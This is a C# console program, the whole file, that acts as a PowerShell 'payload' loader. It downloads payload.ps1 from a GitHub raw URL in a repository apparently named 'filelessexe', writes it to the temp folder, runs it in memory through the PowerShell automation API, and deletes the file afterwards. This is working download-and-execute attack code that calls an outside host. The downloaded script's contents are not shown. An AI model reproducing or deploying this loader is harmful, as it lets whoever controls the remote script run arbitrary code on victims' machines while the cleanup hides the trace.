using System;
using System.IO;
using System.Net.Http;
using System.Management.Automation;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        Console.Title = "PowerShell Executor";
        Console.WriteLine("[INFO] Starting PowerShell script execution...");

        string payloadUrl = "https://raw.githubusercontent.com/N4V33NM/filelessexe/main/payload.ps1";
        Console.WriteLine($"[INFO] Fetching script from: {payloadUrl}");

        string tempPath = Path.Combine(Path.GetTempPath(), "payload.ps1");

        if (await FetchPayload(payloadUrl, tempPath))
        {
            ExecutePayload(tempPath);
        }
        else
        {
            Console.WriteLine("[ERROR] Failed to fetch payload. Exiting...");
        }

        Console.WriteLine("[INFO] Execution completed. Press Enter to exit...");
        Console.ReadLine();
    }

    static async Task<bool> FetchPayload(string url, string tempPath)
    {
        try
        {
            using HttpClient client = new HttpClient();
            string content = await client.GetStringAsync(url);

            await File.WriteAllTextAsync(tempPath, content);
            Console.WriteLine($"[SUCCESS] Payload saved at: {tempPath}");
            return true;
        }
        catch (HttpRequestException ex)
        {
            Console.WriteLine($"[ERROR] HTTP error while fetching payload: {ex.Message}");
        }
        catch (IOException ex)
        {
            Console.WriteLine($"[ERROR] File write error: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Unexpected error: {ex.Message}");
        }
        return false;
    }

    static void ExecutePayload(string filePath)
    {
        try
        {
            Console.WriteLine("[INFO] Executing PowerShell script...");

            string scriptContent = File.ReadAllText(filePath);
            using PowerShell ps = PowerShell.Create();
            ps.AddScript(scriptContent);
            var results = ps.Invoke();

            Console.WriteLine("[INFO] Execution Results:");
            foreach (var result in results)
            {
                Console.WriteLine(result);
            }

            File.Delete(filePath);
            Console.WriteLine("[INFO] Temp file deleted.");
        }
        catch (IOException ex)
        {
            Console.WriteLine($"[ERROR] File error: {ex.Message}");
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"[ERROR] Permission issue: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Execution failed: {ex.Message}");
        }
    }
}








